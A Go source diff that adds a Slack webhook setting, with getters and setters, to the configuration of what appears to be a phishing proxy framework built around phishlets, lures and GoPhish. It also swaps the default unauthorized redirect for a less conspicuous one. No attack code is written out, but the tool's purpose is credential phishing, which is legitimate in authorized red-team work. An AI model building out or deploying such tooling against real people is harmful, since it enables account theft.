@@ -91,22 +91,24 @@ type Config struct {
 	lureIds         []string
 	subphishlets    []*SubPhishlet
 	kbWebhookUrl    string
+	slackWebhookUrl string
 	cfg             *viper.Viper
 }
 
 const (
-	CFG_GENERAL        = "general"
-	CFG_CERTIFICATES   = "certificates"
-	CFG_LURES          = "lures"
-	CFG_PROXY          = "proxy"
-	CFG_PHISHLETS      = "phishlets"
-	CFG_BLACKLIST      = "blacklist"
-	CFG_SUBPHISHLETS   = "subphishlets"
-	CFG_GOPHISH        = "gophish"
-	CFG_KB_WEBHOOK_URL = "kb_webhook_url"
+	CFG_GENERAL           = "general"
+	CFG_CERTIFICATES      = "certificates"
+	CFG_LURES             = "lures"
+	CFG_PROXY             = "proxy"
+	CFG_PHISHLETS         = "phishlets"
+	CFG_BLACKLIST         = "blacklist"
+	CFG_SUBPHISHLETS      = "subphishlets"
+	CFG_GOPHISH           = "gophish"
+	CFG_KB_WEBHOOK_URL    = "kb_webhook_url"
+	CFG_SLACK_WEBHOOK_URL = "slack_webhook_url"
 )
 
-const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
+const DEFAULT_UNAUTH_URL = "https://www.google.com"
 
 func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c := &Config{
@@ -156,6 +158,7 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c.cfg.UnmarshalKey(CFG_GOPHISH, &c.gophishConfig)
 
 	c.kbWebhookUrl = c.cfg.GetString(CFG_KB_WEBHOOK_URL)
+	c.slackWebhookUrl = c.cfg.GetString(CFG_SLACK_WEBHOOK_URL)
 
 	if c.general.OldIpv4 != "" {
 		if c.general.ExternalIpv4 == "" {
@@ -826,4 +829,26 @@ func (c *Config) GetGoPhishApiKey() string {
 
 func (c *Config) GetGoPhishInsecureTLS() bool {
 	return c.gophishConfig.InsecureTLS
+}
+
+func (c *Config) GetKbWebhookUrl() string {
+	return c.kbWebhookUrl
+}
+
+func (c *Config) SetKbWebhookUrl(url string) {
+	c.kbWebhookUrl = url
+	c.cfg.Set(CFG_KB_WEBHOOK_URL, c.kbWebhookUrl)
+	log.Info("keybase webhook url set to: %s", url)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) GetSlackWebhookUrl() string {
+	return c.slackWebhookUrl
+}
+
+func (c *Config) SetSlackWebhookUrl(url string) {
+	c.slackWebhookUrl = url
+	c.cfg.Set(CFG_SLACK_WEBHOOK_URL, c.slackWebhookUrl)
+	log.Info("slack webhook url set to: %s", url)
+	c.cfg.WriteConfig()
 }
